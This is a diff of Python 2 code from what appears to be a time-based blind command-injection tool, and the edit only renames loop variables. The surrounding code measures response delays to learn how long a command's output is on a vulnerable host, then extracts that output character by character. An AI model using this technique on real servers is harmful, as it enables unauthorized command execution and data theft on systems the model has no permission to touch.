@@ -134,14 +134,14 @@ def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,u
   else:
     minlen = 1
   print "\n(*) Retrieving the length of execution output..."
-  for j in range(int(minlen),int(maxlen)):
+  for output_length in range(int(minlen),int(maxlen)):
     
     if alter_shell:
       # Execute shell commands on vulnerable host.
-      payload = tb_payloads.cmd_execution_alter_shell(separator,cmd,j,delay,http_request_method)
+      payload = tb_payloads.cmd_execution_alter_shell(separator,cmd,output_length,delay,http_request_method)
     else:
       # Execute shell commands on vulnerable host.
-      payload = tb_payloads.cmd_execution(separator,cmd,j,delay,http_request_method)
+      payload = tb_payloads.cmd_execution(separator,cmd,output_length,delay,http_request_method)
           
     # Check if defined "--prefix" option.
     if menu.options.prefix:
@@ -239,24 +239,24 @@ def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,u
     if how_long >= delay:
       if menu.options.verbose:
 	print "\n"
-      print colors.BOLD + "(!) Retrieved " + str(j) + " characters."+ colors.RESET
+      print colors.BOLD + "(!) Retrieved " + str(output_length) + " characters."+ colors.RESET
       break
 	      
-  i = j + 1
+  num_of_chars = output_length + 1
   check_start = 0
   check_end = 0
   check_start = time.time()
   
   output = []
-  for i in range(1,int(i)):
+  for num_of_chars in range(1,int(num_of_chars)):
     for ascii_char in range(32, 129):
       
       if alter_shell:
 	# Get the execution ouput, of shell execution.
-	payload = tb_payloads.get_char_alter_shell(separator,cmd,i,ascii_char,delay,http_request_method)
+	payload = tb_payloads.get_char_alter_shell(separator,cmd,num_of_chars,ascii_char,delay,http_request_method)
       else:
 	# Get the execution ouput, of shell execution.
-	payload = tb_payloads.get_char(separator,cmd,i,ascii_char,delay,http_request_method)
+	payload = tb_payloads.get_char(separator,cmd,num_of_chars,ascii_char,delay,http_request_method)
 	
       # Check if defined "--prefix" option.
       if menu.options.prefix:
@@ -340,7 +340,7 @@ def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,u
       if how_long >= delay:
 	if not menu.options.verbose:
 	  output.append(chr(ascii_char))
-	  percent = ((i*100)/j)
+	  percent = ((num_of_chars*100)/output_length)
 	  sys.stdout.write("\r(*) Grabbing the output, please wait... [ "+str(percent)+"% ]")
 	  sys.stdout.flush()
 	else:
